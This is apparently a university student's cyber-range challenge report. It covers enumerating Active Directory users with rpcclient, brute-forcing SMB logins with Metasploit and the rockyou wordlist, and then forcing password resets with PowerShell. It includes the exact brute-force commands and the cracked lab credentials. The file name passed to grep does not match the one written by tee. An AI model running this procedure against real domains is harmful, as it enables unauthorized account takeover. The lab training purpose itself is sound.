# Challenge Report: Bringing Passwords Up To Snuff  
**Course:** CORe 463/563  
**Student:** Ian Sweet  
**Email:** iansweet315@u.boisestate.edu  

---

## Challenge Overview

This challenge focuses on identifying and remediating weak passwords within an Active Directory environment using brute-force techniques. The scenario takes place within the XP CyberRange, where tools like Metasploit and PowerShell are used to conduct the attack and enforce password resets.

---

## Environment Configuration

**Network Subnets:**
- `172.16.30.0/24` – PROD network (Domain Controller, FileShare)
- `172.16.20.0/24` – USRSPC network (Security-Desk, Workstations)
- `172.16.10.0/24` – SUBSCRN network (Joomla server)
- `172.16.40.0/24` – WAN/Outside network

**Firewall Routing:**
- WAN → External
- USRSPC → Security-Desk (`172.16.20.55`)
- PROD → Domain Controller (`172.16.30.55`)
- SUBSCRN → Web services

---

## Tools Used

- **Metasploit (msfconsole)**
- **rpcclient**
- **PowerShell (Set-ADUser)**
- **Linux utilities (grep, cut, nano)**

---

## Steps Taken

### Step 1: User Enumeration
1. Logged into Security-Desk.
2. Connected to Domain Controller using `rpcclient`:
   ```bash
   rpcclient -U "playerone%password123" 172.16.30.55 | tee userdump.txt
   enumdomusers
   grep "user:\[" userinfo.txt | cut -d "[" -f2 | cut -d "]" -f1 > users.txt
   ```

### Step 2: Brute-Force Attack via Metasploit
3. Launched `msfconsole` and loaded SMB brute-force module:
   ```
   use auxiliary/scanner/smb/smb_login
   ```
4. Configured settings:
   ```
   set RHOSTS 172.16.30.55
   set USER_FILE /home/playerone/users.txt
   set PASS_FILE /usr/share/wordlists/rockyou.txt
   set THREADS 10
   set VERBOSE true
   run
   ```
5. Identified weak credentials:
   - `jcortes:iloveme`
   - `nkeefe:987654321`

### Step 3: Password Policy Enforcement
6. Logged into Domain Controller as `playerone`.
7. Launched PowerShell and executed:
   ```powershell
   Set-ADUser -Identity jcortes -PasswordNeverExpires $false
   Set-ADUser -Identity jcortes -ChangePasswordAtLogon $true
   Set-ADUser -Identity nkeefe -PasswordNeverExpires $false
   Set-ADUser -Identity nkeefe -ChangePasswordAtLogon $true
   ```

---

## Outcome

- Password resets successfully enforced.
- Weak credentials were flagged and updated.
- Challenge completed and verified with green checks.

---

## Reflection

This challenge highlighted the importance of strong password policies in Active Directory environments. Brute-forcing with Metasploit was more reliable than Hydra in this case. Using PowerShell for policy enforcement was efficient and repeatable. Managing user lists and cleaning input files was a key step in ensuring reliable brute-force success.
